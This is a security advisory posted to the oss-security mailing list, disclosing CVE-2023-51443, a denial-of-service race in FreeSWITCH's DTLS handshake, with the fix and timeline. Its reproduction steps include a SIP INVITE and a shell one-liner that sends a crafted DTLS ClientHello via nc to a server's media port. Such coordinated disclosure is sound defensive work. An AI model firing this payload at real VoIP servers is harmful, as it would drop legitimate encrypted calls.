Received: (qmail 16366 invoked by uid 550); 23 Dec 2023 18:42:36 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9777 invoked from network); 23 Dec 2023 18:38:31 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	enablesecurity.com; h=cc:content-transfer-encoding:content-type
	:content-type:date:date:from:from:in-reply-to:message-id
	:mime-version:reply-to:subject:subject:to:to; s=fm3; t=
	1703356745; x=1703443145; bh=pqZWzo6igJv5PYlLSneT+VPRxG8uvXMEtqJ
	HnuUcvfA=; b=x2MVrXFvupY4V6PsMOBr+k5UFwapIWZmG0MVU21vAep3ErQ3dNs
	WpWpxoGte+uNQf3eWbsgOIBX5JqSnCtcZA3zZis6g/0UWpMnvjMYG56MPO+ud4nN
	fzQ9O7rI4w8fwulYaWRrB1DWNYD8KTTE+26FSDBYWMSY05CRegKDVX0uBdgWtvmS
	u3dwWETb/69bZb60aXkq+4CHfnUE/Wb8mbEsnptU3qoJheyYRnTaztUfN98FUIvc
	w7wZOnWNbfOAd9wVdhGWcHoRmsn5kr+QDbX490TkA3gjr5deIeKxTFQrP9so7+Ui
	KscQkvKEKYNVnydIUGmrUBMD7Z69augM1xQ==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=cc:content-transfer-encoding:content-type
	:content-type:date:date:feedback-id:feedback-id:from:from
	:in-reply-to:message-id:mime-version:reply-to:subject:subject:to
	:to:x-me-proxy:x-me-proxy:x-me-sender:x-me-sender:x-sasl-enc; s=
	fm2; t=1703356745; x=1703443145; bh=pqZWzo6igJv5PYlLSneT+VPRxG8u
	vXMEtqJHnuUcvfA=; b=r4wOBlqZGqBfDOyvTsILEgDo7ZjV6xaVytZwIGB3XnuT
	nA815kGpsEEQyHyVMJicTNbn98bD1lwGcrDC6CWNp7x/32FS+8rL2rLN7Z0oHsEk
	t3i8ehpddeFNSFce8CUmnK+HXzrhMGNHyuVfE0lJKZNXXdlYNlIh9u/e7EMjcQi6
	nRWPyXhM7YM+x69Amh7NZEjL2rMtvvQRYbNcX1QQzGgtu++j9HOgqrZCNfhRlZ2y
	82ax3UywbCMhqwMC4kmzOGKgV9xm6nbwwBfDtXP4ky5N38ZZ4Nx5qL0D/gCBkwSg
	mGMHA+LE8O4OHExeBVr95q8N+SFdUnypq6ZJf3kz1A==
X-ME-Sender: <xms:SCmHZf76ZT-OO1k_ug7t8DQAilWj408ziPxHIAN4dkV5yKqaCPqjsw>
    <xme:SCmHZU4uCow6wMFPxRNMGunmid4HEEJR1U6zZIYyLyruCAV90yYXsuRR0FhWXG-ED
    t4JbCr-Lj3ewrK3yQ>
X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvkedrvdduledguddujecutefuodetggdotefrod
    ftvfcurfhrohhfihhlvgemucfhrghsthforghilhdpqfgfvfdpuffrtefokffrpgfnqfgh
    necuuegrihhlohhuthemuceftddtnecunecujfgurhepofgfggfkfffhvffutgfgsehtqh
    ertderreejnecuhfhrohhmpedfufgrnhgurhhoucfirghutghifdcuoehsrghnughrohes
    vghnrggslhgvshgvtghurhhithihrdgtohhmqeenucggtffrrghtthgvrhhnpeetfedvgf
    ffkefhkeeuleeghfdtleekveegjeevudeutdejvdetheekieffvdfggfenucffohhmrghi
    nhepghhithhhuhgsrdgtohhmpdhgihhthhhusghushgvrhgtohhnthgvnhhtrdgtohhmpd
    gvnhgrsghlvghsvggtuhhrihhthidrtghomhdpihgvthhfrdhorhhgpdhrthgtshgvtgdr
    tghomhenucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepmhgrihhlfhhrohhmpe
    hsrghnughrohesvghnrggslhgvshgvtghurhhithihrdgtohhm
X-ME-Proxy: <xmx:SCmHZWcjOBH35nydUw9dRfQrepzPRN-lDTL_S0SS92Qe4HrY_XNnfw>
    <xmx:SCmHZQIJjf5KuSIWaz57AKc39HufMjuvb2r6ydhy0YTk0HH4WFdkNw>
    <xmx:SCmHZTJmQF5VmABgLih5JaK5nCPR5wQZ9IHsy__J5jUPPq1orP9s4Q>
    <xmx:SSmHZb3IBju3SExil0CiQpREUZcx-muesvby0rUFxiNYc7UhZOODIg>
Feedback-ID: if8634316:Fastmail
X-Mailer: MessagingEngine.com Webmail Interface
User-Agent: Cyrus-JMAP/3.9.0-alpha0-1364-ga51d5fd3b7-fm-20231219.001-ga51d5fd3
MIME-Version: 1.0
Message-Id: <6c03ed50-7ba0-4b0c-9c65-7c05ba10fea4@app.fastmail.com>
Date: Sat, 23 Dec 2023 19:38:15 +0100
From: "Sandro Gauci" <sandro@enablesecurity.com>
To: oss-security@lists.openwall.com, fulldisclosure@seclists.org,
 fulldisclosure@seclists.org, voipsec@voipsa.org,
 submissions@packetstormsecurity.org, vuln@secunia.com, cert@cert.org
Content-Type: text/plain;charset=utf-8
Content-Transfer-Encoding: quoted-printable
Subject: [oss-security] [ES2023-02] FreeSWITCH susceptible to Denial of Service via DTLS Hello packets
 during call initiation

# FreeSWITCH susceptible to Denial of Service via DTLS Hello packets during=
 call initiation

- Fixed versions: 1.10.11
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tr=
ee/master/ES2023-02-freeswitch-dtls-hello-race
- Vendor Security Advisory: https://github.com/signalwire/freeswitch/securi=
ty/advisories/GHSA-39gv-hq72-j6m6
- Other references: CVE-2023-51443
- Tested vulnerable versions: 1.10.10
- Timeline:
	- Report date: 2023-09-27
	- Triaged: 2023-09-27
	- Fix provided for testing: 2023-09-29
	- Vendor release with fix: 2023-12-22
	- Enable Security advisory: 2023-12-22

## TL;DR

When handling DTLS-SRTP for media setup, FreeSWITCH is susceptible to Denia=
l of Service due to a race condition in the hello handshake phase of the DT=
LS protocol. This attack can be done continuously, thus denying new DTLS-SR=
TP encrypted calls during the attack.

## Description

Our research has shown that key establishment for Secure Real-time Transpor=
t Protocol (SRTP) using Datagram Transport Layer Security Extension (DTLS)[=
^1] is susceptible to a Denial of Service attack due to a race condition. I=
f an attacker manages to send a ClientHello DTLS message with an invalid Ci=
pherSuite (such as `TLS_NULL_WITH_NULL_NULL`) to the port on the FreeSWITCH=
 server that is expecting packets from the caller, a DTLS error is generate=
d. This results in the media session being torn down, which is followed by =
teardown at signaling (SIP) level too.

This behavior was tested against FreeSWITCH version 1.10.10, which was foun=
d to be vulnerable to this issue.

The following sequence diagram shows the normal flow (i.e. no attack) invol=
ving SIP and DTLS messages between a UAC (the Caller) and an FreeSWITCH ser=
ver capable of handling WebRTC calls.

Diagram showing a call setup against FreeSWITCH that uses SIP and DTLS:
https://user-images.githubusercontent.com/4557407/271063734-85425e09-6945-4=
9b1-ba73-751b6d592ea4.png

In a controlled experiment, it was observed that when the Attacker sent a D=
TLS ClientHello to FreeSWITCH's media port from a different IP and port, Fr=
eeSWITCH responded by sending a DTLS Alert to the Caller. Additionally, Fre=
eSWITCH terminated the SIP call by sending a BYE message to the Caller.

Diagram showing a call setup against FreeSWITCH that fails due to an attack=
er controlled DTLS ClientHello:
https://user-images.githubusercontent.com/4557407/271064011-032f9a0e-15af-4=
645-b008-1fe8b706d75e.png

During a real attack, the attacker would spray a vulnerable FreeSWITCH serv=
er with DTLS ClientHello messages. The attacker would typically target the =
range of UDP ports allocated for RTP. When the ClientHello message from the=
 Attacker wins the race against an expected ClientHello from the Caller, th=
e call terminates, resulting in Denial of Service.


## Impact

Abuse of this vulnerability may lead to a massive Denial of Service on vuln=
erable FreeSWITCH servers for calls that rely on DTLS-SRTP.

## How to reproduce the issue

1. Prepare a FreeSWITCH server with an extension configured to handle WebRTC
1. Send an INVITE message to the target server with WebRTC SDP:

    ```default
	INVITE sip:1000@192.168.1.202 SIP/2.0
	Via: SIP/2.0/WSS 192.168.1.202:36742;rport=3D36742;branch=3Dz9hG4bK-jQcnXJ=
adB2VGfGmQ
	Max-Forwards: 70
	From: <sip:1000@192.168.1.202>;tag=3DL9kc5NfpYG1u67cT
	To: <sip:1000@192.168.1.202>
	Contact: <sip:1000@192.168.1.202>
	Call-ID: DzGnBLt0z9SK3MC0
	CSeq: 5 INVITE
	Content-Type: application/sdp
	Content-Length: 385

	v=3D0
	o=3D- 1695296331 1695296331 IN IP4 192.168.1.202
	s=3D-
	t=3D0 0
	c=3DIN IP4 192.168.1.202
	m=3Daudio 45825 UDP/TLS/RTP/SAVPF 0 8 101
	a=3Dsetup:active
	a=3Dfingerprint:sha-256 49:05:98:B2:15:43:1C:9C:4F:29:07:60:F8:63:77:16:80=
:F9:44:C0:97:8E:E5:48:D6:71:B4:03:10:85:D6:E3
	a=3Drtpmap:0 PCMU/8000/1
	a=3Drtpmap:8 PCMA/8000/1
	a=3Drtpmap:101 telephone-event/8000
	a=3Drtcp-mux
	a=3Drtcprsize
	a=3Dsendrecv
	```
1. Note FreeSWITCH's media port and IP values, which will be used as the `<=
freeswitch-ip>` and `<media-port>` parameters by the Attacker
1. Send a DTLS ClientHello message from a (attacker-controlled) host, which=
 is different from the Caller but has network access to the FreeSWITCH serv=
er

    ```bash
	CLIENT_HELLO=3D"Fv7/AAAAAAAAAAAAfAEAAHAAAAAAAAAAcP79AAA"=20
	CLIENT_HELLO=3D"${CLIENT_HELLO}AAG4HCVaUNVbYVmxuqdn2WyCgtTijhZ+WheP/+H"
	CLIENT_HELLO=3D"${CLIENT_HELLO}4AAAACAAABAABEABcAAP8BAAEAAAoACAAGAB0AF"
	CLIENT_HELLO=3D"${CLIENT_HELLO}wAYAAsAAgEAACMAAAANABQAEgQDCAQEAQUDCAUF"
	CLIENT_HELLO=3D"${CLIENT_HELLO}AQgGBgECAQAOAAkABgABAAgABwA=3D"
	echo -n "${CLIENT_HELLO}" | base64 --decode | nc -u <freeswitch-ip> <media=
-port>
	```
1. Observe that the Caller received a DTLS Alert message and a SIP BYE mess=
age on its signaling channel

Note that the above steps are used to reliably reproduce the vulnerability.=
 In case of a real attack, the attacker simply has to spray the FreeSWITCH =
server with DTLS messages.

## Solution and recommendations

To address this vulnerability, upgrade FreeSWITCH to the latest version whi=
ch includes the security fix. The solution implemented is to drop all packe=
ts from addresses that have not been validated by an ICE check.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive securi=
ty tools and provides quality penetration testing to help protect your real=
-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of p=
ublishing based on currently available information. Use of the information =
constitutes acceptance for use in an AS IS condition. There are no warranti=
es with regard to this information. Neither the author nor the publisher ac=
cepts any liability for any direct, indirect, or consequential loss or dama=
ge arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy=
 which can be found at <https://github.com/EnableSecurity/Vulnerability-Dis=
closure-Policy>.

[^1]: Datagram Transport Layer Security (DTLS) Extension to Establish Keys =
for the Secure Real-time Transport Protocol (SRTP) https://datatracker.ietf=
.org/doc/html/rfc5764

--
=20
    Sandro Gauci, CEO at Enable Security GmbH

    Register of Companies:       AG Charlottenburg HRB 173016 B
    Company HQ:                       Neuburger Stra=C3=9Fe 101 b, 94036 Pa=
ssau, Germany
    RTCSec Newsletter:               https://www.rtcsec.com/subscribe
    Our blog:                                https://www.rtcsec.com
    Other points of contact:       https://www.enablesecurity.com/contact/
